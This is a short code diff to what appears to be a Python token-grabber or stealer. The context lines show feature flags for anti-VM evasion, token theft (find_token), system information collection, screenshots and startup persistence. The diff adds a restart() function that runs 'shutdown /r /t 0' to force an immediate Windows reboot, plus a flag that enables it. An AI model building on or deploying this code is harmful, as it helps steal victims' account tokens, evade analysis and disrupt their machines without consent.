@@ -451,6 +451,9 @@ def startup():
     else:
         print("  ")
 
+def restart():
+    os.system("shutdown /r /t 0")
+
 def main():
     feature = {
         "anti_vm": False,
@@ -459,6 +462,7 @@ def main():
         "systeminfo": False,
         "screenshot": False,
         "startup": False,
+        "restart": False
     }
     if feature.get("token", False):
         find_token()
@@ -472,5 +476,7 @@ def main():
         checker() 
     if feature.get("startup", False):
         startup()
+    if feature.get("restart", False):
+        restart()
 
 main()
